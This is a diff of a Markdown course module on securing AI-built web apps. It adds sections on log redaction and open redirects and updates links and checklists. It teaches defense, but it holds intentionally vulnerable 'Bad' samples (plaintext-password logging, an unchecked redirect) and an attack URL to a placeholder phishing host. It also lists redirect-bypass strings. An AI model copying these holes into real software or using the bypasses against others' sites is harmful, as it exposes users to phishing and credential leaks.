-## 3.10 Webhook signature verification (Stripe and friends)
+### 3.10 Webhook signature verification (Stripe and friends)
 
 A webhook is a third party (Stripe, GitHub, Clerk, Twilio) calling *your* endpoint to say "this happened." If you don't verify that the call actually came from them, **anyone can POST "payment succeeded" to your webhook URL** and get the product for free.
 
@@ -1329,11 +1540,11 @@ app.post("/webhooks/stripe", express.raw({ type: "application/json" }), async (r
 });
 ```
 
-In a Next.js route handler, read the raw body with `await req.text()` and pass that string to `constructEvent`. Stripe's documentation says to call `constructEvent()` with the **raw request body**, the `Stripe-Signature` header, and your endpoint secret ([Stripe docs](https://docs.stripe.com/webhooks/signature)). The most common AI bug here is parsing the JSON first, which breaks verification, and then "fixing" that by removing the verification.
+In a Next.js route handler, read the raw body with `await req.text()` and pass that string to `constructEvent`. Stripe's documentation says to call `constructEvent()` with the **raw request body**, the `Stripe-Signature` header, and your endpoint secret ([Stripe docs](https://docs.stripe.com/webhooks#verify-events)). The most common AI bug here is parsing the JSON first, which breaks verification, and then "fixing" that by removing the verification.
 
 Every serious webhook provider has an equivalent signature scheme. Use it.
 
-## 3.11 Security headers and Content-Security-Policy
+### 3.11 Security headers and Content-Security-Policy
 
 Security headers are instructions your server sends to the browser: "don't let other sites frame me," "don't guess file types," "only run scripts from these places." They're cheap, and they turn some bugs (like XSS) from catastrophic into contained.
 
@@ -1385,7 +1596,93 @@ Practical advice:
 
 References: [MDN, Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) and the [OWASP HTTP Headers Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html).
 
-## 3.12 Defense checklist: injection and defaults
+### 3.12 Leaking secrets into logs
+
+Injection has a quieter cousin: putting sensitive data *into your logs*, where it lives forever in plaintext and gets shipped to third-party log services, error trackers, and anyone with read access. AI-generated code does this constantly, because "log the request so I can debug it" is the most natural line in the world.
+
+This is not hypothetical, and it happens to companies that know better. In **May 2018, Twitter** disclosed that a bug had written user **passwords to an internal log in plaintext**, before the hashing step completed, and urged **all 330 million+ users** to change their passwords. GitHub disclosed a very similar logging bug the same year. ([Ars Technica](https://arstechnica.com/information-technology/2018/05/twitter-advises-users-to-reset-passwords-after-bug-posts-passwords-to-internal-log/)) Nobody "hacked" anything; the secret was simply written down where it shouldn't be.
+
+❌ **Bad:**
+
+```js
+app.post("/login", (req, res) => {
+  console.log("login attempt", JSON.stringify(req.body)); // logs the plaintext password
+  // ...
+});
+// Also common: logging full headers (Authorization: Bearer ...),
+// Stripe/OpenAI keys on startup, or entire user objects with password hashes and tokens.
+```
+
+✅ **Good: redact known-sensitive fields before logging, and never log credentials at all.**
+
+```js
+const SENSITIVE = /pass(word)?|token|secret|authorization|api[-_]?key|cookie/i;
+function redact(obj) {
+  if (Array.isArray(obj)) return obj.map(redact);
+  if (obj && typeof obj === "object") {
+    return Object.fromEntries(
+      Object.entries(obj).map(([k, v]) => [k, SENSITIVE.test(k) ? "[REDACTED]" : redact(v)])
+    );
+  }
+  return obj;
+}
+app.post("/login", (req, res) => {
+  console.log("login attempt", JSON.stringify(redact(req.body)));
+  // ...
+});
+```
+
+**Try it yourself.** Expected output:
+
+```text
+v1 login attempt {"email":"a@example.com","password":"hunter2"}      ← bad: password in the clear
+v2 login attempt {"email":"a@example.com","password":"[REDACTED]"}   ← good
+```
+
+**Verification request:** search your running logs for a test password, API key, and session token you used. They should appear **nowhere**. Also grep your code for `console.log(req`, `print(request`, and logger calls that pass whole request/response/user objects. Structured loggers (pino, winston, structlog) support redaction config, which beats hand-rolled regexes once your app grows. See the OWASP Logging Cheat Sheet for what to log and what never to ([OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)).
+
+### 3.13 Open redirects
+
+An **open redirect** is when your app sends the browser to a URL the user controls, without checking it. It looks harmless ("just a redirect"), but it's a gift to phishers: a link that starts with *your* trusted domain and quietly lands on theirs. It also enables token theft when a login flow bounces through a `?next=` or `?returnTo=` parameter.
+
+❌ **Bad:**
+
+```js
+// GET /after-login?next=/dashboard  → but next can be anything
+app.get("/after-login", (req, res) => res.redirect(req.query.next || "/"));
+// Attack: /after-login?next=https://evil.example/login (a convincing fake login page)
+```
+
+✅ **Good: allow only same-site, relative paths.** Parse the target the way a browser would and reject anything that leaves your origin:
+
+```js
+const APP_ORIGIN = "https://app.example.com";
+function safeNext(next) {
+  if (typeof next !== "string" || next === "") return "/";
+  try {
+    const url = new URL(next, APP_ORIGIN); // resolve relative to your own origin
+    if (url.origin !== APP_ORIGIN) return "/"; // different site → go home instead
+    return url.pathname + url.search + url.hash; // keep only the same-site part
+  } catch {
+    return "/";
+  }
+}
+app.get("/after-login", (req, res) => res.redirect(safeNext(req.query.next)));
+```
+
+Naive checks fail in fun ways, which is why parsing beats string matching. All of these should be refused, and the parser above refuses them:
+
+```text
+"https://evil.example"            -> /        (absolute other-origin)
+"//evil.example"                  -> /        (protocol-relative, still leaves your site)
+"/\evil.example"                  -> /        (backslash trick some routers mishandle)
+"https://app.example.com.evil.example/" -> /  (your domain as a prefix of theirs)
+"/dashboard?tab=billing"          -> /dashboard?tab=billing   (legitimate, allowed)
+```
+
+**Try it yourself.** Point a `?next=` or `?returnTo=` parameter at `https://example.com` and see where you land. If the browser leaves your domain, you have an open redirect. The OWASP Unvalidated Redirects and Forwards Cheat Sheet has the full pattern ([OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)).
+
+### 3.14 Defense checklist: injection and defaults
 
 - [ ] **All** database queries are parameterized or use an ORM's safe API, with no string-built SQL and allowlists for dynamic identifiers.
 - [ ] All request input is **validated with a schema** (type, length, format) at the boundary.
@@ -1402,7 +1699,7 @@ References: [MDN, Content Security Policy](https://developer.mozilla.org/en-US/d
 - [ ] Security headers are set (CSP, `nosniff`, HSTS, `frame-ancestors`), verified with `curl -sI`.
 - [ ] Rate limiters know about your proxy setup, and costly actions are limited per account.
 
-## 3.13 Prompt templates: injection and defaults
+### 3.15 Prompt templates: injection and defaults
 
 ```text
 Security requirements for all code in this session:
@@ -1460,20 +1757,20 @@ deployed app.
 
 ---
 
-# Part 4: Hallucinated Dependencies and the Supply Chain
+## Part 4: Hallucinated Dependencies and the Supply Chain
 
-Every `npm install` or `pip install` runs **someone else's code** with **your** permissions, often including install scripts that run immediately. Software Supply Chain Failures is **A03 on the OWASP Top 10:2025** ([OWASP](https://owasp.org/Top10/2025/)). AI adds a new twist: it **invents packages**.
+Every `npm install` or `pip install` runs **someone else's code** with **your** permissions, often including install scripts that run immediately. Software Supply Chain Failures is **A03 on the OWASP Top 10:2025** ([OWASP](https://top10.owasp.org/2025/)). AI adds a new twist: it **invents packages**.
 
-## 4.1 How it happens in vibe-coded apps
+### 4.1 How it happens in vibe-coded apps
 
 - **Package hallucination.** The model confidently imports a package that doesn't exist. In the USENIX Security 2025 study, **19.7%** of 2.23 million package references from 16 models were hallucinated, including **205,474 unique fake names**. Commercial models averaged at least **5.2%** and open-source models **21.7%** ([Spracklen et al.](https://www.usenix.org/conference/usenixsecurity25/presentation/spracklen)).
-- **Slopsquatting.** Attackers register the names AIs keep hallucinating and fill them with malware. The term was coined by Python Software Foundation security developer **Seth Larson** in 2025 ([Socket](https://socket.dev/blog/slopsquatting-how-ai-hallucinations-are-fueling-a-new-class-of-supply-chain-attacks)). The threat is real: a researcher's harmless test package `huggingface-cli`, a name AIs kept inventing, got **30,000+ downloads in three months** ([The Register](https://www.theregister.com/security/2024/03/28/ai-bots-hallucinate-software-packages-and-devs-download-them/858011)).
+- **Slopsquatting.** Attackers register the names AIs keep hallucinating and fill them with malware. The term was coined by Python Software Foundation security developer **Seth Larson** in 2025 ([Socket](https://socket.dev/blog/slopsquatting-how-ai-hallucinations-are-fueling-a-new-class-of-supply-chain-attacks)). The threat is real: a researcher's harmless test package `huggingface-cli`, a name AIs kept inventing, got **15,000+ authentic downloads in three months** ([The Register](https://www.theregister.com/security/2024/03/28/ai-bots-hallucinate-software-packages-and-devs-download-them/858011)).
 - **Typosquatting.** The AI (or you) types a near-miss of a popular package name, and an attacker already owns it.
 - **Abandoned or obscure packages.** The AI suggests a library it saw in old training data that hasn't been maintained in years, has known vulnerabilities, or has a single anonymous maintainer.
 - **No lockfile, floating versions.** `"some-lib": "*"` or unpinned `requirements.txt` means every install might pull a different (possibly compromised) version.
 - **Agents that install on their own.** An agent hits an import error and runs `npm install <whatever-it-imagined>` without asking.
 
-## 4.2 Bad vs. good: adding a dependency
+### 4.2 Bad vs. good: adding a dependency
 
 ❌ **Bad: the vibe workflow.**
 
@@ -1529,7 +1826,7 @@ pip-audit         # same for Python (https://github.com/pypa/pip-audit)
 
 Consider `npm install --ignore-scripts` (or `ignore-scripts=true` in `.npmrc`) for untrusted packages, since install scripts run arbitrary code the moment you install. Turn on **Dependabot** or **Renovate** for update and vulnerability alerts.
 
-## 4.3 Defense checklist: dependencies
+### 4.3 Defense checklist: dependencies
 
 - [ ] **Every new package was verified** before install: it exists, the name is exact, it has a real source repo, a credible maintainer, recent activity, and meaningful usage.
 - [ ] If the AI suggests a package that **doesn't exist**, you **don't** install a similar name. You ask for a well-known alternative, or write the code.
@@ -1540,7 +1837,7 @@ Consider `npm install --ignore-scripts` (or `ignore-scripts=true` in `.npmrc`) f
 - [ ] Agents **can't install packages without approval.**
 - [ ] You periodically **remove unused dependencies**. Every package is attack surface.
 
-## 4.4 Prompt templates: dependencies
+### 4.4 Prompt templates: dependencies
 
 ```text
 Dependency rules:
@@ -1569,7 +1866,7 @@ anything uncertain as "VERIFY MANUALLY."
 
 ---
 
-# Part 5: Test It Like an Attacker (Manual Test Script)
+## Part 5: Test It Like an Attacker (Manual Test Script)
 
 Scanners and AI reviews are useful, but nothing beats sending the requests an attacker would send and seeing what comes back. This script takes 30–60 minutes. **Only run it against apps you own or have written permission to test.**
 
@@ -1682,7 +1979,7 @@ curl -s -X POST "$APP/api/avatar" -H "Authorization: Bearer $A_TOKEN" -F "file=@
 
 ---
 
-# Part 6: Severity Triage: What to Fix Before Launch vs. After
+## Part 6: Severity Triage: What to Fix Before Launch vs. After
 
 You'll find more problems than you can fix in a day. That's normal. Triage decides the order. For each finding, ask four questions:
 
@@ -1695,7 +1992,7 @@ You'll find more problems than you can fix in a day. That's normal. Triage decid
 |---|---|---|---|
 | **P0: Stop-ship** | Anyone, little or no skill, gets bulk access to sensitive data, money, or admin powers | Tables readable or writable without login; `service_role` or Stripe secret key in the bundle; Firebase `if true` rules on user data; unsigned payment webhooks; agent with production write access | **Before launch. If already live: now**, including rotating keys and taking the feature offline if needed |
 | **P1: Must fix before real users** | Any signed-in user can reach other users' data or escalate privileges, or there's a cheap path to large cost | IDOR on records; mass assignment of `role`; admin checks only in the UI; unverified JWTs; no rate limit on paid LLM endpoints; SSRF to internal addresses | Before real users or real data. If live, within days |
-| **P2: Fix soon** | Requires extra conditions, limited impact, or weakens defense in depth | Missing CSP and security headers; tokens in `localStorage`; verbose errors; reset tokens that don't expire; unpinned dependencies; no login rate limit with strong passwords enforced | Within weeks; schedule it |
+| **P2: Fix soon** | Requires extra conditions, limited impact, or weakens defense in depth | Missing CSP and security headers; long-lived tokens or secrets in `localStorage` (a reputable SDK's short-lived session in a client-only app is lower risk, see §1.6); verbose errors; reset tokens that don't expire; unpinned dependencies; no login rate limit with strong passwords enforced | Within weeks; schedule it |
 | **P3: Hardening** | Best practice, low direct risk | Tightening an already-safe CORS list; adding MFA for low-risk apps; cleaning up unused dependencies | Backlog; do it when you touch that code |
 
 Rules of thumb:
@@ -1708,7 +2005,7 @@ Rules of thumb:
 
 ---
 
-# Part 7: The AI Security-Review Prompt Pack
+## Part 7: The AI Security-Review Prompt Pack
 
 The prompts throughout this module target single topics. These are general-purpose reviews to run at key moments. Rules for using them:
 
@@ -1795,7 +2092,7 @@ Any P0 or P1 FAIL means NO-GO. Be adversarial and do not round up.
 
 ---
 
-# Part 8: The Pre-Launch Security Checklist
+## Part 8: The Pre-Launch Security Checklist
 
 Run this before **any** app touches real users, real data, or real money, and again after any big AI-driven change. Each item needs **evidence**: a test result, a command output, a screenshot, a link. "The AI said it's fine" isn't evidence.
 
@@ -1809,7 +2106,7 @@ Run this before **any** app touches real users, real data, or real money, and ag
 
 ### Authentication
 - [ ] Managed auth provider, or passwords hashed with Argon2id, scrypt, or bcrypt.
-- [ ] JWTs and sessions are verified server-side, expire, and are invalidated on logout. No tokens in `localStorage` for sensitive apps.
+- [ ] JWTs and sessions are verified server-side, expire, and are invalidated on logout. No long-lived secrets in `localStorage`; prefer cookie-based sessions (e.g. `@supabase/ssr`, or an HttpOnly cookie) for server-rendered or sensitive apps (see §1.6).
 - [ ] Reset and magic links are random, short-lived, single-use, and use a fixed base URL. No account enumeration.
 - [ ] Email is verified before it grants access to anything.
 
@@ -1915,14 +2212,16 @@ Use your own app, or spin up a throwaway Supabase or Firebase project with a `no
 - **Make the AI do the secure thing explicitly, then verify it yourself.** The prompts in this module raise the floor. The tests, scans, and curl calls are what prove it.
 - **Evidence or it didn't happen.** Run the pre-launch checklist before real users arrive.
 
-Next: [Module 3: Reading the Code You Accepted →](03-reading-code.md)
+---
+
+**Next up:** [Module 3: Reading the Code You Accepted](03-reading-code.md) · [Back to course outline](../course-outline.md)
 
 ---
 
 ## Sources
 
 **Research, standards, and reports**
-- OWASP Top 10:2025: [owasp.org/Top10/2025](https://owasp.org/Top10/2025/)
+- OWASP Top 10:2025: [top10.owasp.org/2025](https://top10.owasp.org/2025/)
 - OWASP GenAI Security Project, *LLM01:2025 Prompt Injection*: [genai.owasp.org](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
 - Veracode, *2025 GenAI Code Security Report*: [press release (XSS 86%, log injection 88%)](https://www.businesswire.com/news/home/20250730694951/en/AI-Generated-Code-Poses-Major-Security-Risks-in-Nearly-Half-of-All-Development-Tasks-Veracode-Research-Reveals) · [blog](https://www.veracode.com/blog/genai-code-security-report/)
 - Perry et al., *Do Users Write More Insecure Code with AI Assistants?*, ACM CCS 2023: [arXiv](https://arxiv.org/abs/2211.03622)
@@ -1938,7 +2237,7 @@ Next: [Module 3: Reading the Code You Accepted →](03-reading-code.md)
 - Base44 (Wiz): [blog](https://www.wiz.io/blog/critical-vulnerability-base44)
 - Tea app (404 Media via Engadget): [article](https://www.engadget.com/cybersecurity/tea-app-suffers-breach-exposing-thousands-of-user-images-190731414.html) · [BBC](https://www.bbc.com/news/articles/c7vl57n74pqo)
 
-**Added in the expansion (authentication, SSRF, uploads, webhooks, headers, triage)**
+**Cheat sheets and additional references**
 - OWASP Password Storage Cheat Sheet: [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
 - OWASP Session Management Cheat Sheet: [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 - OWASP Forgot Password Cheat Sheet: [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
@@ -1946,9 +2245,14 @@ Next: [Module 3: Reading the Code You Accepted →](03-reading-code.md)
 - OWASP SSRF Prevention Cheat Sheet: [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
 - OWASP File Upload Cheat Sheet: [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
 - OWASP HTTP Headers Cheat Sheet: [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
+- OWASP Logging Cheat Sheet: [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
+- OWASP Unvalidated Redirects and Forwards Cheat Sheet: [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
+- Supabase, server-side auth (cookie-based sessions via `@supabase/ssr`): [docs](https://supabase.com/docs/guides/auth/server-side)
+- Next.js, data security (Server Actions are reachable by direct POST): [docs](https://nextjs.org/docs/app/guides/data-security)
+- Twitter plaintext-password logging bug (May 2018): [Ars Technica](https://arstechnica.com/information-technology/2018/05/twitter-advises-users-to-reset-passwords-after-bug-posts-passwords-to-internal-log/)
 - Capital One, 2019 cyber incident facts: [capitalone.com](https://www.capitalone.com/digital/facts2019/) · ACM TOPS analysis: [dl.acm.org](https://dl.acm.org/doi/10.1145/3546068) · AWS letter to Sen. Wyden: [PDF](https://www.wyden.senate.gov/imo/media/doc/081319%20Amazon%20Letter%20to%20Sen%20Wyden%20RE%20Consumer%20Data.pdf)
 - AWS, configuring the instance metadata service (IMDSv2): [docs.aws.amazon.com](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
-- Stripe, webhook signature verification: [docs.stripe.com](https://docs.stripe.com/webhooks/signature)
+- Stripe, webhook signature verification: [docs.stripe.com](https://docs.stripe.com/webhooks#verify-events)
 - MDN, Content Security Policy: [developer.mozilla.org](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) · securityheaders.com: [scanner](https://securityheaders.com/)
 - FIRST, Common Vulnerability Scoring System: [first.org/cvss](https://www.first.org/cvss/)
 
@@ -1956,7 +2260,7 @@ Next: [Module 3: Reading the Code You Accepted →](03-reading-code.md)
 - Supabase, Row Level Security: [docs](https://supabase.com/docs/guides/database/postgres/row-level-security) · Storage access control: [docs](https://supabase.com/docs/guides/storage/security/access-control)
 - Firebase Security Rules: [docs](https://firebase.google.com/docs/rules)
 - Next.js environment variables (`NEXT_PUBLIC_`): [docs](https://nextjs.org/docs/app/guides/environment-variables) · Vite env variables (`VITE_`): [docs](https://vite.dev/guide/env-and-mode)
-- GitHub push protection: [docs](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection)
+- GitHub push protection: [docs](https://docs.github.com/en/code-security/concepts/secret-security/push-protection)
 - Gitleaks: [GitHub](https://github.com/gitleaks/gitleaks) · TruffleHog: [GitHub](https://github.com/trufflesecurity/trufflehog)
 - Flask debug mode warning: [docs](https://flask.palletsprojects.com/en/stable/debugging/)
 - npm audit: [docs](https://docs.npmjs.com/cli/commands/npm-audit) · pip-audit: [GitHub](https://github.com/pypa/pip-audit)
